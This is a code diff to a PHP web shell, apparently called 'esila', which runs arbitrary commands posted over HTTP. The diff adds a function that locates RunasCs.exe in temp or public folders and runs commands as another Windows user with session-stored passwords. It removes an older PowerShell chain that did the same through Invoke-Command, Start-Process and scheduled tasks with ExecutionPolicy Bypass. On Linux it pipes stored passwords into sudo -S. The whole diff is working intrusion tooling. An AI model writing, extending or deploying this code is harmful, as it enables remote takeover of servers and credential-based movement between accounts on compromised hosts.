@@ -27,6 +27,51 @@ define('VERSION', '2.5');
 // PowerShell-safe single-quote escaping for .ps1 scripts
 function ps_quote($s) { return "'" . str_replace("'", "''", $s) . "'"; }
 
+// Find RunasCs.exe on disk (for Windows user switching)
+function get_runascs_path() {
+    static $cached = null;
+    if ($cached !== null) return $cached;
+    $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
+    $checks = array(
+        $tmp . '\\RunasCs.exe',
+        'C:\\Users\\Public\\RunasCs.exe',
+        'C:\\Windows\\Temp\\RunasCs.exe',
+    );
+    foreach ($checks as $p) { if (@file_exists($p)) { $cached = $p; return $p; } }
+    $w = trim(@shell_exec('where RunasCs.exe 2>nul'));
+    if ($w !== '') { $lines = explode("\n", $w); $f = trim($lines[0]); if (@file_exists($f)) { $cached = $f; return $f; } }
+    $cached = '';
+    return '';
+}
+
+// Execute command as another user via RunasCs with fallback for long commands
+function runascs_exec($user, $pass, $cmd, $cwd = '') {
+    $exe = get_runascs_path();
+    if ($exe === '') return '[-] RunasCs.exe not found on disk';
+    $prefix = $cwd !== '' ? 'cd /d ' . escapeshellarg($cwd) . ' && ' : '';
+    $full = $prefix . $cmd;
+    // CreateProcessWithLogonW has ~1024 char limit; use .bat for long commands
+    if (strlen($full) < 900) {
+        $rc = escapeshellarg($exe) . ' ' . escapeshellarg($user) . ' ' . escapeshellarg($pass) . ' "cmd /c ' . str_replace('"', '\\"', $full) . '" 2>&1';
+        $out = esila_exec($rc);
+    } else {
+        $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
+        $bat = $tmp . '\\esila_' . mt_rand(10000,99999) . '.bat';
+        @file_put_contents($bat, "@echo off\r\n" . $full . "\r\n");
+        $rc = escapeshellarg($exe) . ' ' . escapeshellarg($user) . ' ' . escapeshellarg($pass) . ' "cmd /c ' . str_replace('"', '\\"', $bat) . '" 2>&1';
+        $out = esila_exec($rc);
+        @unlink($bat);
+    }
+    // Strip RunasCs [*] warning lines but keep [-] errors
+    $lines = explode("\n", $out);
+    $clean = array();
+    foreach ($lines as $l) {
+        if (strncmp(trim($l), '[*]', 3) === 0) continue;
+        $clean[] = $l;
+    }
+    return implode("\n", $clean);
+}
+
 // Universal command execution - tries multiple methods
 function esila_exec($cmd) {
     $out = '';
@@ -260,43 +305,7 @@ if (isset($_POST['action']) && $_POST['action'] === 'switch_user') {
         exit;
     }
     if (IS_WIN) {
-        $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
-        $rid = mt_rand(10000,99999);
-        $tmpf = $tmp . '\\esila_su_' . $rid . '.txt';
-        $ps1 = $tmp . '\\esila_su_' . $rid . '.ps1';
-        $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
-            . '$o = ' . ps_quote($tmpf) . "\r\n"
-            . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
-            . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
-            . "\$ok = \$false\r\n"
-            . "foreach (\$h in @('.', 'localhost', \$env:COMPUTERNAME)) {\r\n"
-            . "  try {\r\n"
-            . "    \$r = Invoke-Command -ComputerName \$h -Credential \$c -ScriptBlock { whoami } -ErrorAction Stop 2>&1\r\n"
-            . "    Write-Output \$r; \$ok = \$true; break\r\n"
-            . "  } catch { }\r\n"
-            . "}\r\n"
-            . "if (-not \$ok) {\r\n"
-            . "  try {\r\n"
-            . '    Start-Process cmd -Credential $c -ArgumentList "/c whoami > $o" -NoNewWindow -Wait -ErrorAction Stop' . "\r\n"
-            . "    Get-Content \$o; \$ok = \$true\r\n"
-            . "  } catch { }\r\n"
-            . "}\r\n"
-            . "if (-not \$ok) {\r\n"
-            . "  \$tn = 'esila_' + " . ps_quote((string)$rid) . "\r\n"
-            . "  try {\r\n"
-            . '    schtasks /create /tn $tn /tr ("cmd /c whoami > " + $o) /sc once /st 00:00 /ru ' . ps_quote($su_user) . ' /rp ' . ps_quote($su_pass) . " /f 2>&1 | Out-Null\r\n"
-            . "    schtasks /run /tn \$tn 2>&1 | Out-Null\r\n"
-            . "    Start-Sleep -Seconds 2\r\n"
-            . "    schtasks /delete /tn \$tn /f 2>&1 | Out-Null\r\n"
-            . "    if (Test-Path \$o) { Get-Content \$o; \$ok = \$true }\r\n"
-            . "  } catch { }\r\n"
-            . "}\r\n"
-            . "if (-not \$ok) { Write-Output 'All methods failed. Try: WinRM not enabled, or account locked.' }\r\n"
-            . "Remove-Item \$o -Force -ErrorAction SilentlyContinue\r\n"
-            . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
-        @file_put_contents($ps1, $ps_script);
-        $test = esila_exec('powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1');
-        @unlink($ps1);
+        $test = runascs_exec($su_user, $su_pass, 'whoami');
     } else {
         $test = esila_exec('echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' whoami 2>&1');
         if (strpos($test, $su_user) === false && strpos(strtolower($test), strtolower($su_user)) === false) {
@@ -333,79 +342,53 @@ if (isset($_POST['cmd'])) {
     $cmd = trim($_POST['cmd']);
     if ($cmd === '') exit;
     $_SESSION['history'][] = $cmd;
+    $su_user = isset($_SESSION['su_user']) ? $_SESSION['su_user'] : '';
+    $su_pass = isset($_SESSION['su_pass']) ? $_SESSION['su_pass'] : '';
     if (preg_match('/^\s*cd\s*(.*)$/', $cmd, $m)) {
         $target = trim($m[1]);
-        if ($target === '' || $target === '~') $new = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
-        elseif ($target[0] === '/' || (IS_WIN && strlen($target) >= 2 && $target[1] === ':')) $new = realpath($target);
-        else $new = realpath($cwd . DIRECTORY_SEPARATOR . $target);
-        if ($new && is_dir($new)) {
-            $_SESSION['cwd'] = $new;
-            echo "__CWD__:" . $new;
+        if ($target === '' || $target === '~') {
+            $new = getenv('HOME') ?: (getenv('USERPROFILE') ?: (IS_WIN ? 'C:\\' : '/root'));
+        } elseif ($target[0] === '/' || (IS_WIN && strlen($target) >= 2 && $target[1] === ':')) {
+            $new = $target;
         } else {
-            echo "cd: no such file or directory: $target\n";
+            $new = $cwd . DIRECTORY_SEPARATOR . $target;
+        }
+        if (IS_WIN && $su_user !== '') {
+            $check = trim(runascs_exec($su_user, $su_pass, 'cd /d ' . escapeshellarg($new) . ' && cd'));
+            if ($check !== '' && strpos($check, '[-]') === false && strpos($check, 'error') === false) {
+                $_SESSION['cwd'] = $check;
+                echo "__CWD__:" . $check;
+            } else {
+                echo "cd: no such file or directory: $target\n";
+            }
+        } else {
+            $resolved = @realpath($new);
+            if ($resolved && @is_dir($resolved)) {
+                $_SESSION['cwd'] = $resolved;
+                echo "__CWD__:" . $resolved;
+            } else {
+                echo "cd: no such file or directory: $target\n";
+            }
         }
         exit;
     }
     // Build exec command with optional user context
-    $su_user = isset($_SESSION['su_user']) ? $_SESSION['su_user'] : '';
-    $su_pass = isset($_SESSION['su_pass']) ? $_SESSION['su_pass'] : '';
-    if (IS_WIN) {
-        $basecmd = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
-    } else {
-        $basecmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
-    }
     if ($su_user !== '') {
         if (IS_WIN) {
-            $tmp = getenv('TEMP') ?: (getenv('TMP') ?: 'C:\\Windows\\Temp');
-            $r = mt_rand(10000,99999);
-            $outf = $tmp . '\\esila_o' . $r . '.txt';
-            $errf = $tmp . '\\esila_e' . $r . '.txt';
-            $ps1 = $tmp . '\\esila_r' . $r . '.ps1';
-            $ps_script = '$ErrorActionPreference = "Stop"' . "\r\n"
-                . '$o = ' . ps_quote($outf) . "\r\n"
-                . '$e = ' . ps_quote($errf) . "\r\n"
-                . '$p = ConvertTo-SecureString ' . ps_quote($su_pass) . " -AsPlainText -Force\r\n"
-                . '$c = New-Object System.Management.Automation.PSCredential(' . ps_quote($su_user) . ", \$p)\r\n"
-                . "\$cmd = " . ps_quote($basecmd) . "\r\n"
-                . "\$ok = \$false\r\n"
-                . "foreach (\$h in @('.', 'localhost', \$env:COMPUTERNAME)) {\r\n"
-                . "  try {\r\n"
-                . "    Invoke-Command -ComputerName \$h -Credential \$c -ScriptBlock { param(\$x) cmd /c \$x } -ArgumentList \$cmd -ErrorAction Stop\r\n"
-                . "    \$ok = \$true; break\r\n"
-                . "  } catch { }\r\n"
-                . "}\r\n"
-                . "if (-not \$ok) {\r\n"
-                . "  try {\r\n"
-                . '    Start-Process cmd -Credential $c -ArgumentList ("/c " + $cmd + " > " + $o + " 2> " + $e) -NoNewWindow -Wait -ErrorAction Stop' . "\r\n"
-                . "    if (Test-Path \$o) { Get-Content \$o }\r\n"
-                . "    if (Test-Path \$e) { Get-Content \$e }\r\n"
-                . "    \$ok = \$true\r\n"
-                . "  } catch { }\r\n"
-                . "}\r\n"
-                . "if (-not \$ok) {\r\n"
-                . "  \$tn = 'esila_' + " . ps_quote((string)$r) . "\r\n"
-                . "  try {\r\n"
-                . '    schtasks /create /tn $tn /tr ("cmd /c " + $cmd + " > " + $o + " 2> " + $e) /sc once /st 00:00 /ru ' . ps_quote($su_user) . ' /rp ' . ps_quote($su_pass) . " /f 2>&1 | Out-Null\r\n"
-                . "    schtasks /run /tn \$tn 2>&1 | Out-Null\r\n"
-                . "    Start-Sleep -Seconds 3\r\n"
-                . "    schtasks /delete /tn \$tn /f 2>&1 | Out-Null\r\n"
-                . "    if (Test-Path \$o) { Get-Content \$o }\r\n"
-                . "    if (Test-Path \$e) { Get-Content \$e }\r\n"
-                . "    \$ok = \$true\r\n"
-                . "  } catch { }\r\n"
-                . "}\r\n"
-                . "if (-not \$ok) { Write-Output 'All methods failed (Invoke-Command, Start-Process, schtasks)' }\r\n"
-                . "Remove-Item \$o, \$e -Force -ErrorAction SilentlyContinue\r\n"
-                . 'Remove-Item ' . ps_quote($ps1) . " -Force -ErrorAction SilentlyContinue\r\n";
-            @file_put_contents($ps1, $ps_script);
-            $exec = 'powershell -ExecutionPolicy Bypass -File ' . escapeshellarg($ps1) . ' 2>&1';
+            echo runascs_exec($su_user, $su_pass, $cmd . ' 2>&1', $cwd);
         } else {
+            $basecmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
             $exec = 'echo ' . escapeshellarg($su_pass) . ' | sudo -S -u ' . escapeshellarg($su_user) . ' bash -c ' . escapeshellarg($basecmd) . ' 2>&1';
+            echo esila_exec($exec);
         }
     } else {
-        $exec = $basecmd;
+        if (IS_WIN) {
+            $basecmd = "cd /d " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
+        } else {
+            $basecmd = "cd " . escapeshellarg($cwd) . " && " . $cmd . " 2>&1";
+        }
+        echo esila_exec($basecmd);
     }
-    echo esila_exec($exec);
     exit;
 }
 
